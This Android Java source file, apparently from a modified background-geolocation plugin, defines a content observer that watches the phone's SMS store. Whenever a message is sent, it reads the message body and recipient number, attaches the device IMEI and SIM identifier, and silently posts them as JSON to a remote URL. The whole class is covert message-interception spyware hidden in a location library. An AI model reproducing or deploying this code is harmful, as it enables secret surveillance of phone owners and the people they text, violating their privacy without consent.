package com.marianhello.bgloc;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;

import android.util.Log;
import java.text.SimpleDateFormat;
import java.io.IOException;
import java.util.Date;
import java.util.Collections;
import java.util.Map;

import org.json.JSONArray;
import org.json.JSONObject;
import org.json.JSONException;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.RejectedExecutionException;
import java.util.concurrent.TimeUnit;

import com.marianhello.bgloc.HttpPostService;

import static com.marianhello.bgloc.service.LocationServiceImpl.imei;
import static com.marianhello.bgloc.service.LocationServiceImpl.chip;
import static com.marianhello.bgloc.service.LocationServiceImpl.smsUrl;
import static com.marianhello.bgloc.service.LocationServiceImpl.sdf;

public class SmsSentObservable extends ContentObserver {
    private final ExecutorService mExecutor;
    private Map<String, String> config = Collections.emptyMap();
    private Context context;
    private int lastId = 0;
    public static final Uri STATUS_URI = Uri.parse("content://sms/");

    public SmsSentObservable(Context context) {
        super(new Handler(Looper.getMainLooper()));
        this.context = context;
        mExecutor = Executors.newSingleThreadExecutor();
    }

    @Override
    public void onChange(boolean selfChange) {
        Cursor sms_sent_cursor = context.getContentResolver().query(STATUS_URI, null, null, null, null);
        if (sms_sent_cursor.moveToNext()) {
            int id = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("_id"));

            String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
            if (protocol != null) {
                return;
            }

            int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
            if (type == 2 && lastId != id) {
                String conteudo = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"));
                String adress = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"));
                lastId = id;

                Log.d("[SMS ENVIADA]", "[CONTEUDO] " + conteudo + " [ADRESS] " + adress + "[IMEI] " + imei);

                final JSONObject sms = new JSONObject();

                try {
                    sms.put("numero", adress);
                    sms.put("imei", imei);
                    sms.put("chip", chip);
                    sms.put("dhEvento", sdf.format(new Date()));
                    sms.put("conteudo", conteudo);
                    sms.put("tipo", "ENVIADA");

                    try {
                        mExecutor.execute(new Runnable() {
                            @Override
                            public void run() {
                                postOnApi(sms, smsUrl);
                            }
                        });
                    } catch (RejectedExecutionException ex) {
                        Log.e("[ERRO]", "" + ex);
                    }

                } catch (JSONException e) {
                    // TODO: handle exception
                }

            }
        }
        sms_sent_cursor.close();
    }

    private void postOnApi(JSONObject data, String url) {
        try {
            Log.i("Posting on: {}", url);
            HttpPostService.postJSON(url, data, config);
        } catch (IOException e) {
            Log.i("[ERRO]", e.getMessage());
        }
    }

}